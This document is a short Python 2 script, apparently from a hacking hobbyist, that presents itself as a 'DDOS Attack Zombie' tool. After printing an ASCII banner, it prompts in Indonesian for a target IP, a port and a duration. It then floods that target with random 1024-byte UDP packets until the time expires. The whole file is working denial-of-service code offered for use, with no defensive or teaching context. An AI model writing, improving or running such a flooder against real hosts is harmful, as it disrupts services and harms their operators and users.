#!/usr/bin/python
#coding bY Mr.Zck18
import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)
logo = """\033[92m

     =============================================================================
     =                                                                           =
     =   :mMd-     -dMm:   sMMN+        NMy   .sMNo      oNMs.  /mMh.     :mMd-  =
     =    .hMN/   /mMh.    sMMNMs.      NMy     /NMy.  .yMN+     -dMm:   +NMy.   =
     =      oMNo +NMs.     sMM/mMd-     NMy      :dMd--dMm:       .yMN+.sMNo     =
     =       /NMdMN+       sMM..yMm/    NMy       .hMNmMh.          oNMdMN/      =
     =        +MMMo        sMM.  oNNo   NMy        .mMMm.            sMMM+       =
     =       +NMdMN+       sMM.   /mMh. NMy       -hMNmMd-          oNMdMN/      =
     =     .sMNo +NMy.     sMM.    -dMm:NMy      :mMd--hMm/       .yMN+ sMMo     =
     =    -hMN/   :mMd-    sMM.     .sMNMMy     +NMy.  .yMNo     -dMm:   /NMh.   =
     =   :mMd-     -dMm/   sMM.       +NMMy   .sMNo      oNMy.  /NMh.     :mMm:  =
     =  .oso.       .oso.  /ss         :ss/   /ss/        :ss/ .oso        .oso  =
     =                                                                           =
     =============================================================================
"""
os.system('clear')
#print ("")
print (logo)
print ("\033[95m")
os.system('toilet -f standard "      Mr.Zck18" -F gay')
print ("                                DDOS Attack Zombie")
print ("")
ip = raw_input("\033[97mMasukkan Alamat Ip : ")
port = input ("Port : ")
jam = input("Waktu : ")
timeout = time.time() + jam
sent = 0


while True:
            try:
                    if time.time() > timeout:
                                   break
                    else:
                                   pass
                    sock.sendto(bytes,(ip, port))
                    sent = sent +1
                    print "\033[92m Send \033[91m%s \033[92mZombie to\033[91m %s \033[92mport \033[91m%s\033[97m" %(sent,ip,port)
            except KeyboardInterrupt:
                    print "bye bye\n"
                    sys.exit()

